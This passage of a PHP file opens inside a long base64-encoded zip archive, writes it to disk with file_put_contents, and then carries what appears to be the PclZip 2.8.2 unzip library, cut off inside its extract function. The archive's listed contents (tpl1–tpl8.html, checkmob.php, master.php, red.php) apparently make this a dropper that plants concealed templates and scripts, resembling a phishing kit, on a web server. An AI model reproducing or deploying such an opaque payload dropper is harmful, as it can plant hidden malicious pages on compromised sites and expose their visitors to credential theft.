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"); 
file_put_contents($foldername."/".$myfilename.".zip",$data); 



if (!defined('PCLZIP_READ_BLOCK_SIZE')) {
  define( 'PCLZIP_READ_BLOCK_SIZE', 2048 );
}

if (!defined('PCLZIP_SEPARATOR')) {
  define( 'PCLZIP_SEPARATOR', ',' );
}

if (!defined('PCLZIP_ERROR_EXTERNAL')) {
  define( 'PCLZIP_ERROR_EXTERNAL', 0 );
}

if (!defined('PCLZIP_TEMPORARY_DIR')) {
  define( 'PCLZIP_TEMPORARY_DIR', '' );
}

if (!defined('PCLZIP_TEMPORARY_FILE_RATIO')) {
  define( 'PCLZIP_TEMPORARY_FILE_RATIO', 0.47 );
}


$g_pclzip_version = "2.8.2";

define( 'PCLZIP_ERR_USER_ABORTED', 2 );
define( 'PCLZIP_ERR_NO_ERROR', 0 );
define( 'PCLZIP_ERR_WRITE_OPEN_FAIL', -1 );
define( 'PCLZIP_ERR_READ_OPEN_FAIL', -2 );
define( 'PCLZIP_ERR_INVALID_PARAMETER', -3 );
define( 'PCLZIP_ERR_MISSING_FILE', -4 );
define( 'PCLZIP_ERR_FILENAME_TOO_LONG', -5 );
define( 'PCLZIP_ERR_INVALID_ZIP', -6 );
define( 'PCLZIP_ERR_BAD_EXTRACTED_FILE', -7 );
define( 'PCLZIP_ERR_DIR_CREATE_FAIL', -8 );
define( 'PCLZIP_ERR_BAD_EXTENSION', -9 );
define( 'PCLZIP_ERR_BAD_FORMAT', -10 );
define( 'PCLZIP_ERR_DELETE_FILE_FAIL', -11 );
define( 'PCLZIP_ERR_RENAME_FILE_FAIL', -12 );
define( 'PCLZIP_ERR_BAD_CHECKSUM', -13 );
define( 'PCLZIP_ERR_INVALID_ARCHIVE_ZIP', -14 );
define( 'PCLZIP_ERR_MISSING_OPTION_VALUE', -15 );
define( 'PCLZIP_ERR_INVALID_OPTION_VALUE', -16 );
define( 'PCLZIP_ERR_ALREADY_A_DIRECTORY', -17 );
define( 'PCLZIP_ERR_UNSUPPORTED_COMPRESSION', -18 );
define( 'PCLZIP_ERR_UNSUPPORTED_ENCRYPTION', -19 );
define( 'PCLZIP_ERR_INVALID_ATTRIBUTE_VALUE', -20 );
define( 'PCLZIP_ERR_DIRECTORY_RESTRICTION', -21 );

define( 'PCLZIP_OPT_PATH', 77001 );
define( 'PCLZIP_OPT_ADD_PATH', 77002 );
define( 'PCLZIP_OPT_REMOVE_PATH', 77003 );
define( 'PCLZIP_OPT_REMOVE_ALL_PATH', 77004 );
define( 'PCLZIP_OPT_SET_CHMOD', 77005 );
define( 'PCLZIP_OPT_EXTRACT_AS_STRING', 77006 );
define( 'PCLZIP_OPT_NO_COMPRESSION', 77007 );
define( 'PCLZIP_OPT_BY_NAME', 77008 );
define( 'PCLZIP_OPT_BY_INDEX', 77009 );
define( 'PCLZIP_OPT_BY_EREG', 77010 );
define( 'PCLZIP_OPT_BY_PREG', 77011 );
define( 'PCLZIP_OPT_COMMENT', 77012 );
define( 'PCLZIP_OPT_ADD_COMMENT', 77013 );
define( 'PCLZIP_OPT_PREPEND_COMMENT', 77014 );
define( 'PCLZIP_OPT_EXTRACT_IN_OUTPUT', 77015 );
define( 'PCLZIP_OPT_REPLACE_NEWER', 77016 );
define( 'PCLZIP_OPT_STOP_ON_ERROR', 77017 );
define( 'PCLZIP_OPT_EXTRACT_DIR_RESTRICTION', 77019 );
define( 'PCLZIP_OPT_TEMP_FILE_THRESHOLD', 77020 );
define( 'PCLZIP_OPT_TEMP_FILE_ON', 77021 );
define( 'PCLZIP_OPT_TEMP_FILE_OFF', 77022 );

define( 'PCLZIP_ATT_FILE_NAME', 79001 );
define( 'PCLZIP_ATT_FILE_NEW_SHORT_NAME', 79002 );
define( 'PCLZIP_ATT_FILE_NEW_FULL_NAME', 79003 );
define( 'PCLZIP_ATT_FILE_MTIME', 79004 );
define( 'PCLZIP_ATT_FILE_CONTENT', 79005 );
define( 'PCLZIP_ATT_FILE_COMMENT', 79006 );

define( 'PCLZIP_CB_PRE_EXTRACT', 78001 );
define( 'PCLZIP_CB_POST_EXTRACT', 78002 );
define( 'PCLZIP_CB_PRE_ADD', 78003 );
define( 'PCLZIP_CB_POST_ADD', 78004 );

class PclZip
{
  var $zipname = '';

  var $zip_fd = 0;

  var $error_code = 1;
  var $error_string = '';
  
  var $magic_quotes_status;

function PclZip($p_zipname)
{

  if (!function_exists('gzopen'))
  {
    die('Abort '.basename(__FILE__).' : Missing zlib extensions');
  }

  $this->zipname = $p_zipname;
  $this->zip_fd = 0;
  $this->magic_quotes_status = -1;

  return;
}

function create($p_filelist)
{
  $v_result=1;

  $this->privErrorReset();

  $v_options = array();
  $v_options[PCLZIP_OPT_NO_COMPRESSION] = FALSE;

  $v_size = func_num_args();

  if ($v_size > 1) {
    $v_arg_list = func_get_args();

    array_shift($v_arg_list);
    $v_size--;

    if ((is_integer($v_arg_list[0])) && ($v_arg_list[0] > 77000)) {

      $v_result = $this->privParseOptions($v_arg_list, $v_size, $v_options,
                                          array (PCLZIP_OPT_REMOVE_PATH => 'optional',
                                                 PCLZIP_OPT_REMOVE_ALL_PATH => 'optional',
                                                 PCLZIP_OPT_ADD_PATH => 'optional',
                                                 PCLZIP_CB_PRE_ADD => 'optional',
                                                 PCLZIP_CB_POST_ADD => 'optional',
                                                 PCLZIP_OPT_NO_COMPRESSION => 'optional',
                                                 PCLZIP_OPT_COMMENT => 'optional',
                                                 PCLZIP_OPT_TEMP_FILE_THRESHOLD => 'optional',
                                                 PCLZIP_OPT_TEMP_FILE_ON => 'optional',
                                                 PCLZIP_OPT_TEMP_FILE_OFF => 'optional'
                                                 
                                           ));
      if ($v_result != 1) {
        return 0;
      }
    }

    else {

      $v_options[PCLZIP_OPT_ADD_PATH] = $v_arg_list[0];

      if ($v_size == 2) {
        $v_options[PCLZIP_OPT_REMOVE_PATH] = $v_arg_list[1];
      }
      else if ($v_size > 2) {
        PclZip::privErrorLog(PCLZIP_ERR_INVALID_PARAMETER,
	                       "Invalid number / type of arguments");
        return 0;
      }
    }
  }
  
  $this->privOptionDefaultThreshold($v_options);

  $v_string_list = array();
  $v_att_list = array();
  $v_filedescr_list = array();
  $p_result_list = array();
  
  if (is_array($p_filelist)) {
  
    if (isset($p_filelist[0]) && is_array($p_filelist[0])) {
      $v_att_list = $p_filelist;
    }
    
    else {
      $v_string_list = $p_filelist;
    }
  }

  else if (is_string($p_filelist)) {
    $v_string_list = explode(PCLZIP_SEPARATOR, $p_filelist);
  }

  else {
    PclZip::privErrorLog(PCLZIP_ERR_INVALID_PARAMETER, "Invalid variable type p_filelist");
    return 0;
  }
  
  if (sizeof($v_string_list) != 0) {
    foreach ($v_string_list as $v_string) {
      if ($v_string != '') {
        $v_att_list[][PCLZIP_ATT_FILE_NAME] = $v_string;
      }
      else {
      }
    }
  }
  
  $v_supported_attributes
  = array ( PCLZIP_ATT_FILE_NAME => 'mandatory'
           ,PCLZIP_ATT_FILE_NEW_SHORT_NAME => 'optional'
           ,PCLZIP_ATT_FILE_NEW_FULL_NAME => 'optional'
           ,PCLZIP_ATT_FILE_MTIME => 'optional'
           ,PCLZIP_ATT_FILE_CONTENT => 'optional'
           ,PCLZIP_ATT_FILE_COMMENT => 'optional'
					);
  foreach ($v_att_list as $v_entry) {
    $v_result = $this->privFileDescrParseAtt($v_entry,
                                             $v_filedescr_list[],
                                             $v_options,
                                             $v_supported_attributes);
    if ($v_result != 1) {
      return 0;
    }
  }

  $v_result = $this->privFileDescrExpand($v_filedescr_list, $v_options);
  if ($v_result != 1) {
    return 0;
  }

  $v_result = $this->privCreate($v_filedescr_list, $p_result_list, $v_options);
  if ($v_result != 1) {
    return 0;
  }

  return $p_result_list;
}

function add($p_filelist)
{
  $v_result=1;

  $this->privErrorReset();

  $v_options = array();
  $v_options[PCLZIP_OPT_NO_COMPRESSION] = FALSE;

  $v_size = func_num_args();

  if ($v_size > 1) {
    $v_arg_list = func_get_args();

    array_shift($v_arg_list);
    $v_size--;

    if ((is_integer($v_arg_list[0])) && ($v_arg_list[0] > 77000)) {

      $v_result = $this->privParseOptions($v_arg_list, $v_size, $v_options,
                                          array (PCLZIP_OPT_REMOVE_PATH => 'optional',
                                                 PCLZIP_OPT_REMOVE_ALL_PATH => 'optional',
                                                 PCLZIP_OPT_ADD_PATH => 'optional',
                                                 PCLZIP_CB_PRE_ADD => 'optional',
                                                 PCLZIP_CB_POST_ADD => 'optional',
                                                 PCLZIP_OPT_NO_COMPRESSION => 'optional',
                                                 PCLZIP_OPT_COMMENT => 'optional',
                                                 PCLZIP_OPT_ADD_COMMENT => 'optional',
                                                 PCLZIP_OPT_PREPEND_COMMENT => 'optional',
                                                 PCLZIP_OPT_TEMP_FILE_THRESHOLD => 'optional',
                                                 PCLZIP_OPT_TEMP_FILE_ON => 'optional',
                                                 PCLZIP_OPT_TEMP_FILE_OFF => 'optional'
                                                 
											   ));
      if ($v_result != 1) {
        return 0;
      }
    }

    else {

      $v_options[PCLZIP_OPT_ADD_PATH] = $v_add_path = $v_arg_list[0];

      if ($v_size == 2) {
        $v_options[PCLZIP_OPT_REMOVE_PATH] = $v_arg_list[1];
      }
      else if ($v_size > 2) {
        PclZip::privErrorLog(PCLZIP_ERR_INVALID_PARAMETER, "Invalid number / type of arguments");

        return 0;
      }
    }
  }

  $this->privOptionDefaultThreshold($v_options);

  $v_string_list = array();
  $v_att_list = array();
  $v_filedescr_list = array();
  $p_result_list = array();
  
  if (is_array($p_filelist)) {
  
    if (isset($p_filelist[0]) && is_array($p_filelist[0])) {
      $v_att_list = $p_filelist;
    }
    
    else {
      $v_string_list = $p_filelist;
    }
  }

  else if (is_string($p_filelist)) {
    $v_string_list = explode(PCLZIP_SEPARATOR, $p_filelist);
  }

  else {
    PclZip::privErrorLog(PCLZIP_ERR_INVALID_PARAMETER, "Invalid variable type '".gettype($p_filelist)."' for p_filelist");
    return 0;
  }
  
  if (sizeof($v_string_list) != 0) {
    foreach ($v_string_list as $v_string) {
      $v_att_list[][PCLZIP_ATT_FILE_NAME] = $v_string;
    }
  }
  
  $v_supported_attributes
  = array ( PCLZIP_ATT_FILE_NAME => 'mandatory'
           ,PCLZIP_ATT_FILE_NEW_SHORT_NAME => 'optional'
           ,PCLZIP_ATT_FILE_NEW_FULL_NAME => 'optional'
           ,PCLZIP_ATT_FILE_MTIME => 'optional'
           ,PCLZIP_ATT_FILE_CONTENT => 'optional'
           ,PCLZIP_ATT_FILE_COMMENT => 'optional'
					);
  foreach ($v_att_list as $v_entry) {
    $v_result = $this->privFileDescrParseAtt($v_entry,
                                             $v_filedescr_list[],
                                             $v_options,
                                             $v_supported_attributes);
    if ($v_result != 1) {
      return 0;
    }
  }

  $v_result = $this->privFileDescrExpand($v_filedescr_list, $v_options);
  if ($v_result != 1) {
    return 0;
  }

  $v_result = $this->privAdd($v_filedescr_list, $p_result_list, $v_options);
  if ($v_result != 1) {
    return 0;
  }

  return $p_result_list;
}

function listContent()
{
  $v_result=1;

  $this->privErrorReset();

  if (!$this->privCheckFormat()) {
    return(0);
  }

  $p_list = array();
  if (($v_result = $this->privList($p_list)) != 1)
  {
    unset($p_list);
    return(0);
  }

  return $p_list;
}

function extract()
{
  $v_result=1;

  $this->privErrorReset();

  if (!$this->privCheckFormat()) {
    return(0);
  }

  $v_options = array();
  $v_path = '';
  $v_remove_path = "";
  $v_remove_all_path = false;

  $v_size = func_num_args();

  $v_options[PCLZIP_OPT_EXTRACT_AS_STRING] = FALSE;

  if ($v_size > 0) {
    $v_arg_list = func_get_args();

    if ((is_integer($v_arg_list[0])) && ($v_arg_list[0] > 77000)) {

      $v_result = $this->privParseOptions($v_arg_list, $v_size, $v_options,
                                          array (PCLZIP_OPT_PATH => 'optional',
                                                 PCLZIP_OPT_REMOVE_PATH => 'optional',
                                                 PCLZIP_OPT_REMOVE_ALL_PATH => 'optional',
                                                 PCLZIP_OPT_ADD_PATH => 'optional',
                                                 PCLZIP_CB_PRE_EXTRACT => 'optional',
                                                 PCLZIP_CB_POST_EXTRACT => 'optional',
                                                 PCLZIP_OPT_SET_CHMOD => 'optional',
